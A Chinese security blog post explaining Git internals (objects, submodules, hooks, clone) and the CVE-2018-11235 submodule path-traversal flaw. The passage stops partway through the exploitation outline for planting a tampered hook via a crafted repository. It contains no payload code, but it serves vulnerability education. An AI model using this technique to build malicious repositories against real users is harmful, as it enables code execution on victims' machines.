<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Git 出乎意料的攻击面 | 天工实验室</title>
<meta name="keywords" content="Git">
<meta name="description" content="Git 出乎意料的攻击面 一、来自Git的威胁 现如今，很多软件开发者已经对git工具非常熟悉，很多人的开发流程中会使用这个工具进行仓库备份，与其他开发者进行代码同步，实现合作开发等等。然而，这样的工具也可能成为黑客入侵的突破口。本文就git的相关基础以及实际案例，列举现阶段中git可能出现的攻击面。
二、Git工作原理 在聊git的攻击面之前，我们需要弄清楚git是怎么工作的。举个例子来说，假设我们现在有一个空仓库叫做main-repo，此时我们在其中创建文件test.txt，test.txt中包含内容：
123 在未commit的时候，此文件结构如下：
├── .git │ ├── HEAD │ ├── config │ ├── description │ ├── hooks // 省略这其中的文件 │ ├── info │ │ └── exclude │ ├── objects │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ └── tags └── main.txt 此时，如果我们将这个修改commit之后，目录结构会变成如下：
. ├── .git │ ├── COMMIT_EDITMSG │ ├── HEAD │ ├── config │ ├── description │ ├── index │ ├── info │ │ └── exclude │ ├── logs │ │ ├── HEAD │ │ └── refs │ │ └── heads │ │ └── main │ ├── objects │ │ ├── 45 │ │ │ └── bfe823309403a8fd790cce2013dda0e7f67b5b │ │ ├── 8e │ │ │ └── 1e8a2e68efa3744caf8b601bd0de70c6fe4b66 │ │ ├── bf │ │ │ └── 1fa3d901014eeb98e85a0ed1cd1dd0e83ab3f6 │ │ ├── f6 │ │ │ └── c47b7d00ea7068e091f23601063a1f557df458 │ │ ├── fe │ │ │ └── 8fd7574c9a5c4f805f8239829989cef7129d29 │ │ ├── info │ │ └── pack │ └── refs │ ├── heads │ │ └── main │ └── tags ├── .">
<meta name="author" content="l1nk">
<link rel="canonical" href="http://localhost:1313/blog/tiangongarticle041/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.9b0c42f9222bc665b5845e6199fc07fd87b025125d3366cc5f873b0f54ca8481.css" integrity="sha256-mwxC&#43;SIrxmW1hF5hmfwH/YewJRJdM2bMX4c7D1TKhIE=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/blog/tiangongarticle041/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="天工实验室 (Alt + H)">
                <img src="http://localhost:1313/logo/logo3.png" alt="" aria-label="logo"
                    height="100" style="margin-top: 15px;">
            </a>
            <div class="logo-switches">
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/archives" title="归档">
                    <span>归档</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="https://poc.qianxin.com/home" title="破壳官网">
                    <span>破壳官网</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">主页</a>&nbsp;»&nbsp;<a href="http://localhost:1313/blog/">博客</a></div>
    <h1 class="post-title entry-hint-parent">
      Git 出乎意料的攻击面
    </h1>
    <div class="post-meta"><span title='2024-07-31 00:00:00 +0000 UTC'>2024年07月31日</span>&nbsp;·&nbsp;9 分钟&nbsp;·&nbsp;l1nk

</div>
  </header>

  <div class="author">
    <div class="author_avatar">
      <img src="/authors/l1nk.jpg" alt="l1nk">
    </div>
    <div class="author_info">
      <span class="author_id">l1nk</span>
      <p class="author_description">Datacon 2023 出题人，主攻二进制漏洞挖掘</p>
    </div>
  </div>
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/git/">Git</a></li>
    </ul><br/> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">目录</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#git-%e5%87%ba%e4%b9%8e%e6%84%8f%e6%96%99%e7%9a%84%e6%94%bb%e5%87%bb%e9%9d%a2" aria-label="Git 出乎意料的攻击面">Git 出乎意料的攻击面</a><ul>
                        
                <li>
                    <a href="#%e4%b8%80%e6%9d%a5%e8%87%aagit%e7%9a%84%e5%a8%81%e8%83%81" aria-label="一、来自Git的威胁">一、来自Git的威胁</a></li>
                <li>
                    <a href="#%e4%ba%8cgit%e5%b7%a5%e4%bd%9c%e5%8e%9f%e7%90%86" aria-label="二、Git工作原理">二、Git工作原理</a><ul>
                        
                <li>
                    <a href="#21-git-%e5%af%b9%e8%b1%a1%e7%ae%a1%e7%90%86" aria-label="2.1 git 对象管理">2.1 git 对象管理</a></li>
                <li>
                    <a href="#22-git-%e7%9a%84%e5%af%b9%e8%b1%a1%e6%9c%ac%e8%b4%a8" aria-label="2.2 git 的对象本质">2.2 git 的对象本质</a></li>
                <li>
                    <a href="#23-submodule" aria-label="2.3 submodule">2.3 submodule</a></li>
                <li>
                    <a href="#24-hooks" aria-label="2.4 hooks">2.4 hooks</a></li>
                <li>
                    <a href="#25-git-clone-%e5%8f%91%e7%94%9f%e4%ba%86%e4%bb%80%e4%b9%88" aria-label="2.5 git clone 发生了什么">2.5 git clone 发生了什么</a></li></ul>
                </li>
                <li>
                    <a href="#%e4%b8%89git%e6%94%bb%e5%87%bb%e6%8a%80%e5%b7%a7" aria-label="三、.git攻击技巧">三、.git攻击技巧</a><ul>
                        
                <li>
                    <a href="#31-cve-2018-11235" aria-label="3.1 CVE-2018-11235">3.1 CVE-2018-11235</a><ul>
                        
                <li>
                    <a href="#311-%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="3.1.1 利用思路">3.1.1 利用思路</a></li>
                <li>
                    <a href="#312-%e4%bf%ae%e5%a4%8d%e7%ad%96%e7%95%a5" aria-label="3.1.2 修复策略">3.1.2 修复策略</a></li></ul>
                </li>
                <li>
                    <a href="#32-cve-2024-32002" aria-label="3.2 CVE-2024-32002">3.2 CVE-2024-32002</a><ul>
                        
                <li>
                    <a href="#321-%e6%bc%8f%e6%b4%9e%e6%88%90%e5%9b%a0" aria-label="3.2.1 漏洞成因">3.2.1 漏洞成因</a></li>
                <li>
                    <a href="#322-%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" aria-label="3.2.2 漏洞复现">3.2.2 漏洞复现</a></li>
                <li>
                    <a href="#323-%e4%bf%ae%e5%a4%8d%e7%ad%96%e7%95%a5" aria-label="3.2.3 修复策略">3.2.3 修复策略</a></li></ul>
                </li></ul>
                </li>
                <li>
                    <a href="#%e5%9b%9b%e6%80%bb%e7%bb%93" aria-label="四、总结">四、总结</a></li>
                <li>
                    <a href="#%e4%ba%94%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" aria-label="五、参考链接">五、参考链接</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h1 id="git-出乎意料的攻击面">Git 出乎意料的攻击面<a hidden class="anchor" aria-hidden="true" href="#git-出乎意料的攻击面">#</a></h1>
<h2 id="一来自git的威胁">一、来自Git的威胁<a hidden class="anchor" aria-hidden="true" href="#一来自git的威胁">#</a></h2>
<p>现如今，很多软件开发者已经对git工具非常熟悉，很多人的开发流程中会使用这个工具进行仓库备份，与其他开发者进行代码同步，实现合作开发等等。然而，这样的工具也可能成为黑客入侵的突破口。本文就git的相关基础以及实际案例，列举现阶段中git可能出现的攻击面。</p>
<!-- raw HTML omitted -->
<h2 id="二git工作原理">二、Git工作原理<a hidden class="anchor" aria-hidden="true" href="#二git工作原理">#</a></h2>
<p>在聊git的攻击面之前，我们需要弄清楚git是怎么工作的。举个例子来说，假设我们现在有一个空仓库叫做<code>main-repo</code>，此时我们在其中创建文件<code>test.txt</code>，<code>test.txt</code>中包含内容：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">123
</code></pre><p>在未commit的时候，此文件结构如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">├── .git
│   ├── HEAD
│   ├── config
│   ├── description
│   ├── hooks // 省略这其中的文件
│   ├── info
│   │   └── exclude
│   ├── objects
│   │   ├── info
│   │   └── pack
│   └── refs
│       ├── heads
│       └── tags
└── main.txt
</code></pre><p>此时，如果我们将这个修改commit之后，目录结构会变成如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
├── .git
│   ├── COMMIT_EDITMSG
│   ├── HEAD
│   ├── config
│   ├── description
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
│   │   ├── HEAD
│   │   └── refs
│   │       └── heads
│   │           └── main
│   ├── objects
│   │   ├── 45
│   │   │   └── bfe823309403a8fd790cce2013dda0e7f67b5b
│   │   ├── 8e
│   │   │   └── 1e8a2e68efa3744caf8b601bd0de70c6fe4b66
│   │   ├── bf
│   │   │   └── 1fa3d901014eeb98e85a0ed1cd1dd0e83ab3f6
│   │   ├── f6
│   │   │   └── c47b7d00ea7068e091f23601063a1f557df458
│   │   ├── fe
│   │   │   └── 8fd7574c9a5c4f805f8239829989cef7129d29
│   │   ├── info
│   │   └── pack
│   └── refs
│       ├── heads
│       │   └── main
│       └── tags
├── .gitmodules
|
└── test.txt

40 directories, 60 files
</code></pre><p>可以注意到，这个<code>.git</code>目录下多出了很多的内容。<code>.git</code>目录就是git工作最关键的一个文件夹，里面会存储以下内容：</p>
<ul>
<li>每一次commit的相关操作</li>
<li>临时修改的内容</li>
<li>修改文件的索引</li>
<li>git基础配置</li>
<li>服务端和客户端的钩子事件</li>
</ul>
<p>其中，我们此时提交的commit 如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">commit fe8fd7574c9a5c4f805f8239829989cef7129d29
Author:
Date:   Sat May 25 17:09:42 2024 +0800

    init repo
</code></pre><p>可以看到，commit正对应着目录<code>fe</code>，而文件名正好就是fe后面的一串hash，可以看到这些目录和log对应关系如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">fe      | 8fd7574c9a5c4f805f8239829989cef7129d29
目录名字 | 文件名字
</code></pre><p>这些hash文件都是一些二进制文件，文件如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">hexdump -C .git/objects/fe/8fd7574c9a5c4f805f8
239829989cef7129d29
00000000  78 01 95 8e 49 0a 03 21  10 00 73 f6 15 7d 0f 84  |x...I..!..s..}..|
00000010  76 57 08 21 0f c8 27 5c  5a 22 c1 71 46 9c 43 7e  |vW.!..&#39;\Z&#34;.qF.C~|
00000020  1f bf 90 6b 41 51 95 7a  6b 75 02 37 ea 32 07 11  |...kAQ.zku.7.2..|
00000030  28 1d 0b 39 21 25 7a 85  32 b8 92 ad c7 94 48 20  |(..9!%z.2.....H |
00000040  97 39 07 24 5b 8c 8d 3a  b2 70 ce 77 1f f0 3d c3  |.9.$[..:.p.w..=.|
00000050  f6 aa db 07 ee d6 7a a7  84 97 fa 79 1c b7 d4 db  |......z....y....|
00000060  03 b8 e5 c6 08 c7 9d 80  2b 3a 44 b6 e8 8a 4d fa  |........+:D...M.|
00000070  53 63 75 5b 8b 83 f6 ce  7e 83 5c 31 c1           |Scu[....~.\1.|
0000007d
</code></pre><p>这些内容似乎都有不太能看得懂，这些文件都是什么呢？实际上，git就是用这些文件来实现文件的存储功能。</p>
<h3 id="21-git-对象管理">2.1 git 对象管理<a hidden class="anchor" aria-hidden="true" href="#21-git-对象管理">#</a></h3>
<p>git本质上是一个类文件管理系统，其使用一种称为<strong>对象模型</strong>的方式来存储数据。主要的 Git 对象类型包括：</p>
<ul>
<li><code>Blob（Binary Large Object）</code>：存储文件的内容；</li>
<li><code>Tree</code>：存储目录结构和文件名到 blob 引用的映射；</li>
<li><code>Commit</code>：存储指向 tree 对象的引用，以及提交信息（如作者、日期、父提交等）；</li>
<li><code>Tag</code>：可以指定一些特殊的commit。</li>
</ul>
<p>这些文件我们可以使用指令：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git cat-file -p 目录名+文件名
</code></pre><p>来查看对应的文件内容（这里文件名和git默认规则一样，不需要敲全） 我们检查之前提到的<code>fe</code>目录下的文件，可以看到内容为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git cat-file -p fe8fd757
tree 45bfe823309403a8fd790cce2013dda0e7f67b5b
author 1716628182 +0800
committer 1716628182 +0800

init repo
</code></pre><p>这种文件就被称之为<code>commit</code>。每一个<code>commit</code>文件中会记录一个叫做<code>tree</code>的对象，用于记录<strong>当前commit中修改后的文件。</strong></p>
<p>每一个<code>tree</code>正好也对应了当前修改的目录和文件，尝试访问可以得到如下结果：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git cat-file -p 45bfe8
100644 blob bf1fa3d901014eeb98e85a0ed1cd1dd0e83ab3f6    test.txt
</code></pre><p>每一个<code>tree</code>中会记录一个到多个<code>blob</code>，表示对一个<code>blob</code>的引用，我们最后查看对应的<code>blob</code>：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git cat-file -p bf1fa3
123
</code></pre><p>正是我们文件的内容。git正是使用了这种层级的对象管理机制，将所有的内容关联起来。</p>
<p><img loading="lazy" src="/attachments/2024-07-31-git/af94b7bc-8ac0-4d6c-96b8-44b72142a047.png" alt=""  />
</p>
<h3 id="22-git-的对象本质">2.2 git 的对象本质<a hidden class="anchor" aria-hidden="true" href="#22-git-的对象本质">#</a></h3>
<p>那实际上，git存储的对象为什么是一个乱码的形式呢？实际上<a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">参考官网</a>，我们会知道这段数据其实被zlib压缩了，我们可以尝试编写代码解密这段内容：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> zlib
</span></span><span style="display:flex;"><span>fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;fe8fd757&#34;</span>,<span style="color:#e6db74">&#39;rb&#39;</span>)
</span></span><span style="display:flex;"><span>content <span style="color:#f92672">=</span> fd<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(zlib<span style="color:#f92672">.</span>decompress(content))
</span></span></code></pre></div><p>这个时候能够得到答案：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">b&#39;commit 164\x00tree 45bfe823309403a8fd790cce2013dda0e7f67b5b\nauthor 1716628182 +0800\ncommitter 1716628182 +0800\n\ninit repo\n&#39;
</code></pre><p>可以看到，这里的文件内容正好就是我们之前使用<code>git cat-file -p</code> 打印的内容。同样的，我们也可以获得对应的<code>blob</code>文件的内容：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">b&#39;blob 12\x00\xff\xfe1\x002\x003\x00\r\x00\n\x00&#39;
</code></pre><p><em>这里使用的是utf16le的格式建立的文件，所以有一些前缀。</em></p>
<p>我们可以总结出这些文件的特征：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">+--------+-----+
|  Type  | size|
+--------+-----+
|              |
| Content      |
|              |
|     Body     |
|              |
+--------------+
</code></pre><p><em>根据这个特征，我们可以自己制作一个类似的blob文件。</em></p>
<h3 id="23-submodule">2.3 submodule<a hidden class="anchor" aria-hidden="true" href="#23-submodule">#</a></h3>
<blockquote>
<p>有些时候，我们可能要再一个仓库中引用另一个仓库的内容，这个库可能是一个基础库，会在多个库中被使用，例如压缩，日志打印等等，为了能够正确处理上述的场景，在git中，支持将另一个仓库作为<code>submodule</code>引入到当前库中。</p>
</blockquote>
<p>在讨论子模块之前，我们需要区分为三个概念：</p>
<ul>
<li>子模块的名字，体现在<code>--name</code>参数上，我们这里写作<code>&lt;name&gt;</code></li>
<li>子模块的路径，这个为倒数第二个参数，这里写作<code>&lt;submodule_repo&gt;</code></li>
<li>子模块在主仓库中的名字，这里写作<code>&lt;submodule_path&gt;</code></li>
</ul>
<p>之后我们会反复使用这三个概念来描述不同的术语。</p>
<p>例如我们有另一个库，叫做<code>submodule-repo</code>，里面有一个文件叫做<code>submodule.txt</code>，内容如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat .<span style="color:#ae81ff">\s</span>ubmodule.txt
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;This is the submodule&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$ git log
</span></span><span style="display:flex;"><span>commit fb0721550dd927a7d312d8bdcf14b98da9916c46 <span style="color:#f92672">(</span>HEAD -&gt; master<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Author: 
</span></span><span style="display:flex;"><span>Date:   Fri May <span style="color:#ae81ff">24</span> 19:52:19 <span style="color:#ae81ff">2024</span> +0800
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Initial commit in submodule
</span></span></code></pre></div><p>此时文件结构如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
|
+-main-repo
| |
| +-main.txt
|
+-submodule-repo
  |
  +- submodule.txt
</code></pre><p>此时，假设我们想将其引入到我们主要仓库中，我们可以这样做</p>
<ol>
<li>
<p>将其作为一个叫做<code>submodule</code>的库，添加到当前的库中：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git submodule add ../submodule-repo submodule --name x/y
</code></pre></li>
<li>
<p>提交修改：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">git commit -m &#34;Add submodule&#34;
</code></pre></li>
</ol>
<p>那么此时，我们上面提及的三个参数分别为：</p>
<ul>
<li>name:x/y</li>
<li>submodule_repo:../submodule-repo</li>
<li>submodule_path: submodule</li>
</ul>
<p>此时我们再次检查<code>main-repo</code>的目录，结果如下：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.
├── .git
│   ├── COMMIT_EDITMSG
│   ├── HEAD
│   ├── config
│   ├── description
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
│   │   ├── HEAD
│   │   └── refs
│   │       └── heads
│   │           └── main
│   ├── modules
│   │   └── x
│   │       └── y
│   │           ├── HEAD
│   │           ├── config
│   │           ├── description
│   │           ├── index
│   │           ├── info
│   │           │   └── exclude
│   │           ├── logs
│   │           │   ├── HEAD
│   │           │   └── refs
│   │           │       ├── heads
│   │           │       │   └── master
│   │           │       └── remotes
│   │           │           └── origin
│   │           │               └── HEAD
│   │           ├── objects
│   │           │   ├── 00
│   │           │   │   └── 7744580def9ad1f0a8af7b6e41817d3c0e46a1
│   │           │   ├── c0
│   │           │   │   └── 26d12e4c219329af50ca23d0f4d86f6f21d09e
│   │           │   ├── fb
│   │           │   │   └── 0721550dd927a7d312d8bdcf14b98da9916c46
│   │           │   ├── info
│   │           │   └── pack
│   │           ├── packed-refs
│   │           └── refs
│   │               ├── heads
│   │               │   └── master
│   │               ├── remotes
│   │               │   └── origin
│   │               │       └── HEAD
│   │               └── tags
│   ├── objects
│   │   ├── 45
│   │   │   └── bfe823309403a8fd790cce2013dda0e7f67b5b
│   │   ├── 8a
│   │   │   └── bc80979dd62689bc910bdc266106333b38bdd8
│   │   ├── 8e
│   │   │   └── 1e8a2e68efa3744caf8b601bd0de70c6fe4b66
│   │   ├── bf
│   │   │   └── 1fa3d901014eeb98e85a0ed1cd1dd0e83ab3f6
│   │   ├── f6
│   │   │   └── c47b7d00ea7068e091f23601063a1f557df458
│   │   ├── fe
│   │   │   └── 8fd7574c9a5c4f805f8239829989cef7129d29
│   │   ├── info
│   │   └── pack
│   └── refs
│       ├── heads
│       │   └── main
│       └── tags
├── .gitmodules
├── out.txt
├── submodule
│   ├── .git
│   └── submodule.txt
└── test.txt
</code></pre><p>可以发现，在<code>main-repo</code>目录中新增了如下内容：</p>
<ul>
<li>根据<code>submodule_path</code>创建的<code>submodule</code>目录，里面包含了<code>submodule-repo</code>的内容，其中这里的<code>.git</code>为符号链接，指向<code>../.git/modules/submodule</code>，也就是<code>&lt;target_repo&gt;/.git/modules/&lt;name&gt;</code>这个路径；</li>
<li><code>.gitmodules</code>文件；</li>
<li><code>.git</code>目录中新增了<code>modules</code>，里面包含了一个由<code>&lt;name&gt;</code>命名的<code>submodule</code>的目录，如果此处使用了<code>--add name</code>，此时目录名字会被替换成<code>name</code>；在这个例子中，目录被替换成了二级目录<code>x/y</code>，同时这个目录中包含的是<code>submodule-repo</code>中<code>.git</code>的全部内容。</li>
</ul>
<p>这里的<code>.gitmodules</code>文件记录了当前submodule的基本情况：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">[submodule &#34;x/y&#34;]
        path = submodule
        url = ../submodule-repo
</code></pre><ul>
<li>引号部分记录的正是参数<code>--add name</code>后方的<code>&lt;name&gt;</code>也即是<code>x/y</code>；</li>
<li>path 中记录了模块在这个仓库中的路径<code>&lt;submodule_path&gt;</code>，也就是我们最后跟着的参数，这个是【submodule实际的存放路径，以及检出后存放的路径】；</li>
<li>url 中则记录了对应的路径<code>&lt;submodule_repo&gt;</code>，是倒数第二个参数。</li>
</ul>
<p>此时，<code>.git/config</code>下的文件也会发生变化：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">[core]
        repositoryformatversion = 0
        filemode = false
        bare = false
        logallrefupdates = true
        symlinks = false
        ignorecase = true
[submodule &#34;x/y&#34;]
        url = D:/test_git/submodule-repo
        active = true
</code></pre><p>config中会包含新的模块信息。</p>
<p>同时我们也注意到，此时git会<strong>将子项目目录中的.git放到当前目录的.git中</strong>，存放规则为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/&lt;name&gt;
</code></pre><p><code>&lt;name&gt;</code>的命名支持为多级路径，例如如果命名为<code>path1/path2</code>，则此时存放路径就会变为：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/path1/path2
</code></pre><p>同时还有一点：<code>submodule</code>在正常clone阶段，他是不会被拷贝下来，而是作为一个文件目录存在。当我们需要将其一并拷贝下来的时候，通常需要添加使用指令：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone --recurse-submodules
</span></span></code></pre></div><p>或者在拷贝下来后，使用：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git submodule update --init
</span></span></code></pre></div><p>进行初始化。此时会按照配置文件进行git的子模块拷贝。</p>
<p>整个<code>submodule</code>的clone过程，根据逆向分为两个部分：</p>
<ol>
<li>
<p>尝试将对应仓库的<code>.git</code>单独<code>clone</code>下来，但是不进行checkout，根据分析代码，其指令大致如下：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>git clone --no-checkout --progress --separate-git-dir &lt;target_repo&gt;/.git/modules/submodule --no-single-branch -- &lt;submodule_path&gt; &lt;target_repo&gt;/&lt;name&gt;
</span></span></code></pre></div></li>
<li>
<p>完成clone之后，最终会根据指定的branch，将内容进行checkout，最终释放对应的文件内容。</p>
</li>
</ol>
<h3 id="24-hooks">2.4 hooks<a hidden class="anchor" aria-hidden="true" href="#24-hooks">#</a></h3>
<p>之前的展示中特意跳过了<code>hooks</code>这个目录，这个目录中有很多脚本的样例：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">+── hooks
   ├── applypatch-msg.sample
   ├── commit-msg.sample
   ├── fsmonitor-watchman.sample
   ├── post-update.sample
   ├── pre-applypatch.sample
   ├── pre-commit.sample
   ├── pre-merge-commit.sample
   ├── pre-push.sample
   ├── pre-rebase.sample
   ├── pre-receive.sample
   ├── prepare-commit-msg.sample
   ├── push-to-checkout.sample
   └── update.sample
</code></pre><p>这些脚本会在<strong>git的某个操作阶段执行</strong>。例如<code>pre-push</code>这个名字的脚本会在git执行push指令前执行，<code>commit-msg</code>则是在commit阶段会执行。我们之后的攻击中会涉及一个叫做<code>post-checkout</code>的脚本，这个脚本会在<code>checkout</code>操作后执行。</p>
<h3 id="25-git-clone-发生了什么">2.5 git clone 发生了什么<a hidden class="anchor" aria-hidden="true" href="#25-git-clone-发生了什么">#</a></h3>
<p>当我们执行<code>git clone</code>操作的时候，实际上执行了以下几个操作：</p>
<ol>
<li>创建指定的仓库名字<code>mkdir -p &lt;path&gt;</code></li>
<li>初始化git仓库<code>git init</code></li>
<li>添加远程仓库<code>git remote add origin &lt;url&gt;</code></li>
<li>下载对象引用等<code>git fetch origin</code></li>
<li>创建远程跟踪分支<code>git branch --track &lt;branch&gt; origin/&lt;branch&gt;</code></li>
<li>检出默认分支<code>git checkout &lt;branch&gt;</code></li>
</ol>
<p>实际上，代码文件在第4步就会被下载下来，并且存放在<code>.git</code>文件中，之后由对应的<code>branch</code>和<code>checkout</code>操作来进行编辑组合。</p>
<h2 id="三git攻击技巧">三、.git攻击技巧<a hidden class="anchor" aria-hidden="true" href="#三git攻击技巧">#</a></h2>
<p>经过前面的分析，可以知道<code>.git</code>其实为一个非常完整的文件系统，因此可以将对文件系统的攻击思路迁移到上面，一个常规的思路就是<code>.git</code>文件泄露源码，由于非常常规，这里就不多提了。然而实际上，很多人可能没注意的是，<code>git</code>在作为客户端使用的时候，依然有这里要介绍的是<code>git</code>指令在访问恶意repo的时候，可能会遭受的恶意攻击。</p>
<h3 id="31-cve-2018-11235">3.1 CVE-2018-11235<a hidden class="anchor" aria-hidden="true" href="#31-cve-2018-11235">#</a></h3>
<p>这个漏洞是一个比较老的漏洞，其针对的是<code>submodule</code>进行的攻击。网上可以找到<a href="https://github.com/j4k0m/CVE-2018-11235/blob/main/exploit.sh">对应的exp</a>。这个问题的本质源于一个我们刚刚提到的有趣的点：<code>&lt;name&gt;</code>可以被命名为多级目录。那么，<strong>如果这个多级目录被命名为</strong><code>..</code>，那会发生什么呢？实际上，这个漏洞就是利用这一点。</p>
<p>假设我们在添加目录的时候，<code>&lt;name&gt;</code>写作<code>../../test</code>，那么实际上，添加的目录就变成了：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/../../test
</code></pre><p>此时，如果我们进行子模块初始化的时候，这个test目录<strong>就能够被放到.git目录外面</strong>，从而实现一个目录穿越。</p>
<h4 id="311-利用思路">3.1.1 利用思路<a hidden class="anchor" aria-hidden="true" href="#311-利用思路">#</a></h4>
<p>当我们尝试更新submodule 的时候，git会从<code>.gitmodules</code>中找到<code>submodule</code>对应的<code>url</code>，从那处开始拷贝文件，然后将文件放置到如下位置：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/&lt;name&gt;
</code></pre><p>此时我们就能够得到一个<strong>任意文件写</strong>的原语。可以考虑到：</p>
<ul>
<li>我们此时可以将一个远端仓库的文件写入任意目录</li>
<li>远端仓库的文件名和文件内容是可以任意决定的</li>
</ul>
<p>那么结合git提供的各种特性，不难想到此时可以利用<code>hooks</code>中的各种文件进行rce操作。</p>
<p>然而要如何让我们的文件落入到指定的hooks目录中呢？那么此时就要考虑到另一个特性：</p>
<ul>
<li><code>submodule.name</code>会决定我们的<code>submodule</code>拷贝的时候会拷贝到哪个目录</li>
</ul>
<p>换句话说，实际上选择路径：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">.git/modules/&lt;name&gt;
</code></pre><p>本质上是因为同级的子目录下，存在：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">&lt;submodule_path&gt;/.git
</code></pre><p>当我们更新的时候，其实是从<code>.gitmodules</code>中找到<code>submodule_path</code>，并且再从本地找到对应的：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">&lt;submodule_path&gt;/.git
</code></pre><p>依据里面记录的：</p>
<pre tabindex="0"><code class="language-none" data-lang="none">gitdir: ../.git/modules/&lt;name&gt;
</code></pre><p>在找到最终子目录执行<code>git clone</code>访问到最终的路径。</p>
<p><img loading="lazy" src="/attachments/2024-07-31-git/a7b0cfef-820e-4e9f-a078-f09ba102513c.png" alt=""  />
</p>
<p>所以此时我们只需要篡改我们的<code>&lt;submodule_path&gt;</code>中对应的<code>.git</code>文件，让其指向一个<strong>适合的位置</strong>，这个位置中<strong>包含大部分普通的</strong><code>submodule git</code>中的正常内容，以及一个被篡改过的<code>hook</code>文件。此时按照这个模式来构建git repo，当受害者尝试进行对应repo的<code>submodule</code>更新的时候，就能实现劫持攻击。</p>
